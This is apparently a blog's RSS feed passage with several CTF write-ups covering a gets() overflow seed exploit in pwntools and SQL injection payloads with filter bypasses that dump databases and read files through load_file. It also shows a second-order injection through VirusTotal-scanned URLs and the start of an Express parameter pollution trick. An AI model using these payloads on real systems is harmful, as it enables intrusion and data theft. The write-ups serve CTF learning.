&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/B64DECODER&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;troll-50pts&#34;&gt;&lt;strong&gt;TROLL (50pts)&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/AgJ7rGR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed
value to the time and finally the beginning of the loop and generating the random numbers and questions each time .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/AApFQgK.png&#34; alt=&#34;MAIN&#34;&gt;&lt;/p&gt;
&lt;p&gt;My idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored&lt;/p&gt;
&lt;p&gt;My input :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/XqjEzZQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored)  hold the value of &amp;ldquo;MMMM&amp;rdquo;
so if we replace &amp;ldquo;MMMM&amp;rdquo; with the value we want , this value will be the seed for the random numbers.&lt;/p&gt;
&lt;p&gt;I have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;time.h&amp;gt;

int main(int argc, char *argv[]){
    int i=0;
int seed=3472328296227680305    //0x1000 in decimal
srand(seed);
for(i=0;i&amp;lt;=99;i++){
    int a=rand()% 100000 + 1;
    printf(&amp;quot;%d\n&amp;quot;,a);  
} 
 return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
#p=process(&amp;quot;./troll&amp;quot;)
p=remote(&amp;quot;challenges.tamuctf.com&amp;quot;,4765)
p.recvuntil(&amp;quot;Who goes there?&amp;quot;)
SEED=&amp;quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000&amp;quot;
p.sendline(SEED)
log.info(&amp;quot;Sent First payload&amp;quot;)
answers=open(&amp;quot;answer&amp;quot;,&amp;quot;r&amp;quot;)
for line in answers:
        p.recvuntil(&amp;quot;What is it?&amp;quot;)
        log.info(&amp;quot;sending answer: &amp;quot;+line)
        p.sendline(line)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Note: the offset in the remote server is different, so i had to guess it xD However we got our flag :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/QjwTHDR.png&#34; alt=&#34;MAIN&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Task files &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/TROLL&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The After Prequal - Securinets Quals 2k20</title>
      <link>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</link>
      <pubDate>Mon, 23 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</guid>
      <description>&lt;h1 id=&#34;the-after-prequal-971pts-19-solves&#34;&gt;&lt;strong&gt;The after-Prequal (971pts) (19 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/pXLjH4n.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let&amp;rsquo;s start the exploitation of the famous SQL injection :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/B2IbSxr.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After the basic enumeration we can notice that these characters are filtered : &lt;strong&gt;[&amp;quot; &amp;ldquo;,&amp;rdquo;-&amp;quot;,&amp;quot;,&amp;quot;]&lt;/strong&gt; so we will use the following bypasses:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The white space : &lt;strong&gt;%0A&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;The &amp;ldquo;-&amp;rdquo; : we will use &lt;strong&gt;#&lt;/strong&gt; to comment&lt;/li&gt;
&lt;li&gt;The &amp;ldquo;,&amp;rdquo; : we will use join to bypass it&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This step took me some time , after some tries i succeeded in equilibrating the query :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/5VSI80e.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Tables:&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Table name&lt;/strong&gt;: secrets&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/m190lNI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Columns:&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=&amp;ldquo;secrets&amp;rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The interesting &lt;strong&gt;Column name&lt;/strong&gt; : value&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/TegJtmS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And finally :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/8ycD4ru.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Damn no flag for us :&amp;rsquo;( but no problem maybe if we just do load_file(&amp;ldquo;flag.txt&amp;rdquo;) we will have the flag ? unfortunately it wont work, in fact it&amp;rsquo;s not that easy and this is the most juicy part of the task xd
i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/TgUXftd.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To limit the location in which files can be read and written, set the &lt;strong&gt;secure_file_priv&lt;/strong&gt; system variable to a specific directory. See Section 5.1.8, âServer System Variablesâ.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So probably the author have set a custom location in the global variable &lt;strong&gt;secure_file_priv&lt;/strong&gt; , let&amp;rsquo;s check its value in @@GLOBAL.secure_file_priv&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Pdn180B.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;BINGOOO ! so let&amp;rsquo;s have our flag now :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(&amp;quot;/var/lib/mysql-files/flag/flag.txt&amp;quot;))b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don&amp;rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Empire Total - Securinets Quals 20</title>
      <link>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</link>
      <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</guid>
      <description>&lt;h1 id=&#34;empire-total-1000pts-7-solves&#34;&gt;&lt;strong&gt;Empire Total (1000pts) (7 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/rGcoI7o.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This task was really so creative and i had so fun solving it , but i can&amp;rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let&amp;rsquo;s download it and begin our trip xD&lt;/p&gt;
&lt;p&gt;After Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/k7ScCjX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bjRXPJT.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After cloning the project here is its structure&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;git clone 
&lt;a href=&#34;https://github.com/mohamedaymenkarmous/virustotal-api-html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/mohamedaymenkarmous/virustotal-api-html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/alxzV41.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;let&amp;rsquo;s take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the
&lt;strong&gt;shell_exec&lt;/strong&gt; function :D Interesting hmmm&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/A1kiMAa.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;shell_exec&lt;/strong&gt; is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$command = &amp;quot;../VirusTotal.py &#39;$scanned_ip&#39;&amp;quot;;
$output = shell_exec($command);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But unfortunately there&amp;rsquo;s too much restriction on our input :( it&amp;rsquo;s impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; if(isset($_POST) &amp;amp;&amp;amp; !empty($_POST)){
  $scanned_ip=isset($_POST[&#39;ip&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;ip&#39;])  &amp;amp;&amp;amp; !is_array($_POST[&#39;ip&#39;]) ? $_POST[&#39;ip&#39;] : &amp;quot;&amp;quot;;
  if(!$scanned_ip){header(&amp;quot;Location: /?invalid_ip&amp;quot;);exit();}
  if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) {
  } else {header(&amp;quot;Location: /?invalid_ip&amp;quot;);exit();}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s proceed , it seems that the index.php is pretty safe ,let&amp;rsquo;s take a look at the VirusTotal.py script&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ytcYYQQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;OMG :&amp;rsquo;( 499 lines , that was so discouraging @Emperors :( but we needed that flag to have the 10th place xD anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website,
when we enter the ip address it asks the Virus Total API for the results and then there&amp;rsquo;s the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads
the results from the database .&lt;/p&gt;
&lt;p&gt;So if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors &amp;lt;3 ) i found something interesting :D&lt;/p&gt;
&lt;p&gt;before we proceed here&amp;rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;  def persistURLs(self,selected_ips,ip_report_filtered):
    attr=&amp;quot;detected_urls&amp;quot;
    table_name=&amp;quot;vt_scanned_urls_table&amp;quot;
    newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr
    selected_urls=self.findPersistedIP(selected_ips[0][&#39;id&#39;],table_name)
    selected_urls_filtered=[]
    for selected_url in selected_urls:
      selected_urls_filtered.append(selected_url[&#39;url&#39;])
    if newAttr in ip_report_filtered:
     for url in ip_report_filtered[newAttr]:
      print(url[&#39;URL&#39;])
      if url[&#39;URL&#39;] not in selected_urls_filtered:
        try:
          self.CursorRW.execute(&amp;quot;INSERT INTO &amp;quot;+table_name+&amp;quot; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;quot;+str(selected_ips[0][&#39;id&#39;])+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;URL&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Detections&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Scanned&#39;]+&amp;quot;&#39;)&amp;quot;)
          self.DBRW.commit()
          self.resetSQL()
        except Exception as e:
          print(&amp;quot;INSERT INTO &amp;quot;+table_name+&amp;quot; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;quot;+str(selected_ips[0][&#39;id&#39;])+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;URL&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Detections&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Scanned&#39;]+&amp;quot;&#39;)&amp;quot;)
          print(&amp;quot;EXCEPTION: &amp;quot;,e)
          self.resetSQL()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;So the idea is that if we go to VirusTotal website (
&lt;a href=&#34;https://www.virustotal.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.virustotal.com/&lt;/a&gt;) and scan a url ,and then go back to our challenge website and scan the url&amp;rsquo;s ip
we will find that the url we scanned in VirusTotal website will appear , it&amp;rsquo;s pretty confusing i know so let&amp;rsquo;s have an example&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=Just testing for the writeup :p&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/mGOQ1tQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Now we go back to the challenge website and scan the ip address&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/N7ymSRT.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yeeees ! it&amp;rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.&lt;/p&gt;
&lt;p&gt;Now here is our scenario , if we look to the vulnerable function &lt;strong&gt;persistURLs&lt;/strong&gt; in VirusTotal.py we can notice the injection in this query (line 430)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;INSERT INTO &amp;ldquo;+table_name+&amp;rdquo; (ip_id,url,detections,scanned_time) VALUES (&amp;rsquo;&amp;quot;+str(selected_ips[0][&amp;lsquo;id&amp;rsquo;])+&amp;quot;&amp;rsquo;,&amp;rsquo;&amp;quot;+url[&amp;lsquo;URL&amp;rsquo;]+&amp;quot;&amp;rsquo;,&amp;rsquo;&amp;quot;+url[&amp;lsquo;Detections&amp;rsquo;]+&amp;quot;&amp;rsquo;,&amp;rsquo;&amp;quot;+url[&amp;lsquo;Scanned&amp;rsquo;]+&amp;quot;&amp;rsquo;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We have control over the &lt;strong&gt;url[&amp;lsquo;URL&amp;rsquo;]&lt;/strong&gt; parameter (the url we scan in VirusTotal Website) so it&amp;rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The url encoding &lt;strong&gt;%20&lt;/strong&gt; that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass:  &lt;strong&gt;/**/&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;The second thing faced me when i was solving the challenge , we can&amp;rsquo;t use &lt;strong&gt;&amp;ndash; -&lt;/strong&gt; to equilibrate the SQL query so we will have to find a solution to equilibrate it&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/Empire%20Total/test.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Finally I opted to this solution, here is the URL we will scan :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/1),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The complete SQL query that will be executed is  :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (&amp;lsquo;2&amp;rsquo;,&amp;lsquo;100.26.206.184/?u=&amp;rsquo;,(select 1),(select 2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&amp;rsquo;,&amp;lsquo;15&amp;rsquo;,&amp;lsquo;yes&amp;rsquo;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s try it now , we first scan it in VirusTotal :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/3L7lmrs.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And now let&amp;rsquo;s scan the IP in the challenge website  :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/f2CRd7H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s fetched successfully, let&amp;rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/U3SEcaV.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Bingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Dump DB names :&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/AJvdMXB.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;DBName : MySecretDatabase&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Dump Tables and Columns :&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),(&amp;lsquo;103&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/raYuUmI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Table Name&lt;/strong&gt; : SecretTable &amp;amp; &lt;strong&gt;Column Name&lt;/strong&gt; : secret_value&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;And finally let&amp;rsquo;s have our beloved flag :&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),(&amp;lsquo;109&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/FanWbUZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yees We did it , &lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}&lt;/p&gt;
&lt;p&gt;I have really liked the idea of the challenge, it&amp;rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.&lt;/p&gt;
&lt;p&gt;I hope you liked the writeup if you have any questions don&amp;rsquo;t hesitate to contact me &lt;strong&gt;Twitter&lt;/strong&gt; : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Ã¥ngstrom CTF 2k20 - Web Exploitation</title>
      <link>https://ahmed-belkahla.me/post/angstromctf20/</link>
      <pubDate>Thu, 19 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/angstromctf20/</guid>
      <description>&lt;h1 id=&#34;a-peculiar-query-180pts-73-solves&#34;&gt;&lt;strong&gt;A Peculiar Query (180pts) (73 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/A6EHPkW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I really liked this web task , we are given this web page that have a search functionality&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/gRutDcV.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And we can read the source code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;
const express = require(&amp;quot;express&amp;quot;);
const rateLimit = require(&amp;quot;express-rate-limit&amp;quot;);
const app = express();
const { Pool, Client } = require(&amp;quot;pg&amp;quot;);
const port = process.env.PORT || 9090;
const path = require(&amp;quot;path&amp;quot;);

const client = new Client({
	user: process.env.DBUSER,
	host: process.env.DBHOST,
	database: process.env.DBNAME,
	password: process.env.DBPASS,
	port: process.env.DBPORT
});

async function query(q) {
	const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE &#39;${q}%&#39;;`);
	return ret;
}

app.set(&amp;quot;view engine&amp;quot;, &amp;quot;ejs&amp;quot;);

app.use(express.static(&amp;quot;public&amp;quot;));

app.get(&amp;quot;/src&amp;quot;, (req, res) =&amp;gt; {
	res.sendFile(path.join(__dirname, &amp;quot;index.js&amp;quot;));
});

app.get(&amp;quot;/&amp;quot;, async (req, res) =&amp;gt; {
	if (req.query.q) {
		try {
			let q = req.query.q;
			// no more table dropping for you
			let censored = false;
			for (let i = 0; i &amp;lt; q.length; i ++) {
				if (censored || &amp;quot;&#39;-\&amp;quot;.&amp;quot;.split``.some(v =&amp;gt; v == q[i])) {
					censored = true;
					q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
				}
			}
			q = q.substring(0, 80);
			const result = await query(q);
			res.render(&amp;quot;home&amp;quot;, {results: result.rows, err: &amp;quot;&amp;quot;});
		} catch (err) {
			console.log(err);
			res.status(500);
			res.render(&amp;quot;home&amp;quot;, {results: [], err: &amp;quot;aight wtf stop breaking things&amp;quot;});
		}
	} else {
		res.render(&amp;quot;home&amp;quot;, {results: [], err: &amp;quot;&amp;quot;});
	}
});

app.listen(port, function() {
	client.connect();
	console.log(&amp;quot;App listening on port &amp;quot; + port);
});

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
&lt;p&gt;It&amp;rsquo;s pretty obvious that we have an sql injection here ( we are concatenating the user input )&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;const ret = await client.query(&lt;code&gt;SELECT name FROM Criminals WHERE name ILIKE &#39;${q}%&#39;;&lt;/code&gt;);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;But as we can see some filters are here :&amp;rsquo;( these characters are filtered : [&amp;rsquo;,-,&amp;quot;,.] , after some tries i have figured that it will be impossible to bypass
them so i started looking to some JS tricks.
As we can see the filter function is looping over our input and checks if there are some prohibited characters and then it will replace
them with &amp;ldquo;*&amp;rdquo; , For example if we type&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hello&amp;quot;or 1=1 &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Our input will be changed to :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hello************&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let q = req.query.q;
let censored = false;
for (let i = 0; i &amp;lt; q.length; i ++) {
	if (censored || &amp;quot;&#39;-\&amp;quot;.&amp;quot;.split``.some(v =&amp;gt; v == q[i])) {
			censored = true;
			q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
			}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And finally it&amp;rsquo;s using substring function to limit our input&amp;rsquo;s length to 80 characters&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;q = q.substring(0, 80);
const result = await query(q);
res.render(&amp;quot;home&amp;quot;, {results: result.rows, err: &amp;quot;&amp;quot;});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hmmm everything seems okay nah ? but it&amp;rsquo;s a ctf web task we have to find some vulnerabilities ! let&amp;rsquo;s pass to how i did to solve it now, enough boring things&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;The first thing i thinked about was http parameter pollution in express (read about it &lt;strong&gt;
&lt;a href=&#34;https://github.com/expressjs/express/issues/1824&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; if you want ) ,briefly when we enter a get parameter multiple times express
has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?q=hello&amp;amp;q=allo&amp;amp;q=fword&lt;/p&gt;
&lt;/blockquote&gt;
